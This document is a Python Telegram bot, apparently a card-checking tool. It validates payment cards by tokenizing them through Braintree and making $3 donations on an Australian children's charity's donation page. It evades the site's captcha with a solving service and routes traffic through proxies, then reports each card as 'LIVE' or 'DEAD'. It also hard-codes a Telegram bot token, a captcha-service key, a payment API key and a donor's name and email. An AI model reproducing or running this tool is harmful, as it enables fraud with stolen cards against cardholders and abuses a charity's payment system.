import requests
import json
import re
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

proxy_config = None  # Biến toàn cục lưu proxy

class BraintreeTool:
    def __init__(self):
        # URL API
        self.api_url = "https://payments.braintree-api.com/graphql"
        self.captcha_url = "https://autocaptcha.pro/apiv3/process"
        self.payment_url = "https://fundraising.childhood.org.au/payments/donate/embedded"
        self.status_url = "https://fundraising.childhood.org.au/payments/donate/retrieve-payment-status"

    def getcards(self, text: str):
        text = text.replace('\n', ' ').replace('\r', '')
        card = re.findall(r"[0-9]+\d", text)
        
        if len(card) == 0 or len(card) < 3:
            return None  

        cc = card[0]
        mes = card[1]
        ano = card[2]
        cvv = card[3]
        
        return cc, mes, ano, cvv  

    def tokenize_credit_card(self, cc, mes, ano, cvv):
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "NA"
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                    tokenizeCreditCard(input: $input) {     
                        token     
                        creditCard {       
                            bin       
                            brandCode       
                            last4       
                            expirationMonth      
                            expirationYear      
                        }   
                    } 
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "Bearer production_mb3d6dk2_yp2cn3cq7mt3jzpw",
            "Braintree-Version": "2018-05-10",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "payments.braintree-api.com",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }

        # Sử dụng proxy nếu đã được cấu hình
        proxies = None
        if proxy_config:
            proxies = {
                'http': proxy_config,
                'https': proxy_config
            }

        response = requests.post(self.api_url, headers=headers, json=payload, proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            return data['data']['tokenizeCreditCard']['token']
        else:
            return None

    def get_captcha(self):
        captcha_payload = {
            "key": "f85a2bb5c748b3f78eaea839d89b1f64",
            "type": "recaptchav2",
            "googlesitekey": "6LcavOAjAAAAAJ3ApKU6NcsLJJm26rP4DJiI0UTJ",
            "pageurl": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }

        # Không sử dụng proxy cho API giải captcha
        response = requests.post(self.captcha_url, headers=headers, data=json.dumps(captcha_payload))

        if response.status_code == 200:
            data = response.json()
            return data.get('captcha')  
        else:
            return None

    def process_payment(self, token, captcha):
        payment_payload = {
            "DonationType": "D",
            "RegularGivingSettings": {
                "Enable": False,
                "Frequency": "M",
                "NextPayment": "2024-10-29 15:50:15 +00:00",
                "Amount": 3
            },
            "DonationItems": [{
                "AcceptCost": False,
                "IsAnonymous": False,
                "TaxTypeId": 1,
                "ProductType": 1,
                "Description": "Tax Deductible Donation",
                "UnitPrice": 3,
                "Quantity": 1,
                "BeneficiaryId": 1268
            }],
            "TokenDetailsForTransaction": {
                "Token": token,
                "Type": "CC",
                "CredentialHolder": "Thanh Vu"
            },
            "CustomerDetails": {
                "DonorType": "I",
                "FirstName": "Thanh",
                "LastName": "Vu",
                "EmailAddress": "jpbeluga3@gmail.com"
            },
            "TuringTest": captcha,
            "MetaData": []
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "ceH0CkTb8gWQ6JVU3uq0jdoJnJzPF9ReeGawyEBJ58iDyTHoTkMePKNdMT6ziA36kZ23ZBGsPyqm3npX_n0eYZe3nqs1:fWydDKhIC_5tk8_3p_JlMUsXvcOKhyubMZPC5k3RHRZPn76LAlmpVfPuER7laPcgVQb9e8FJb7-jcO4p5gkuiqje0Os1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }

        # Sử dụng proxy nếu đã được cấu hình
        proxies = None
        if proxy_config:
            proxies = {
                'http': proxy_config,
                'https': proxy_config
            }

        response = requests.post(self.payment_url, headers=headers, data=json.dumps(payment_payload), proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            return data['data']['ReferenceId']
        else:
            return None

    def check_payment_status(self, ref_id):
        status_payload = {
            "clientReferenceId": ref_id
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }

        # Sử dụng proxy nếu đã được cấu hình
        proxies = None
        if proxy_config:
            proxies = {
                'http': proxy_config,
                'https': proxy_config
            }

        response = requests.post(self.status_url, headers=headers, data=json.dumps(status_payload), proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            status = data.get('PaymentStatus', "Failure")
            failure_message = data.get('FailureMessage', "No specific message")
            return status, failure_message
        else:
            return "Failure", None


async def handle_be(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_input = ' '.join(context.args)
    tool = BraintreeTool()
    card_info = tool.getcards(card_input)

    if not card_info:
        await update.message.reply_text(f"Invalid card format: {card_input}")
        return

    cc, mes, ano, cvv = card_info
    token = tool.tokenize_credit_card(cc, mes, ano, cvv)
    if not token:
        await update.message.reply_text(f"Failed to tokenize card {cc[-4:]}. Card is DEAD.")
        return
    
    await update.message.reply_text(f"Tokenized card {cc[-4:]}: Token {token}")

    captcha = tool.get_captcha()
    if not captcha:
        await update.message.reply_text("Captcha retrieval failed, aborting process.")
        return
    
    ref_id = tool.process_payment(token, captcha)
    if ref_id:
        await update.message.reply_text(f"Waiting for payment status (7 seconds)...")
        time.sleep(7)
        status, failure_message = tool.check_payment_status(ref_id)
        if status == "SUCCESS":
            await update.message.reply_text(f"Payment for card {cc[-4:]} was successful! Card is LIVE.")
        else:
            await update.message.reply_text(f"Payment for card {cc[-4:]} failed: {failure_message}. Card is DEAD.")
    else:
        await update.message.reply_text(f"Failed to process payment for card {cc[-4:]}. Card is DEAD.")


async def handle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_config
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /proxy <ip>:<port>:<username>:<password>")
        return

    proxy_parts = context.args[0].split(":")
    if len(proxy_parts) == 4:
        ip = proxy_parts[0]
        port = proxy_parts[1]
        username = proxy_parts[2]
        password = proxy_parts[3]
        proxy_config = f"http://{username}:{password}@{ip}:{port}"
        await update.message.reply_text(f"Proxy set to: {proxy_config}")
    else:
        await update.message.reply_text("Invalid proxy format. Usage: /proxy <ip>:<port>:<username>:<password>")


def main():
    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()

    app.add_handler(CommandHandler("be", handle_be))
    app.add_handler(CommandHandler("proxy", handle_proxy))

    app.run_polling()


if __name__ == "__main__":
    main()
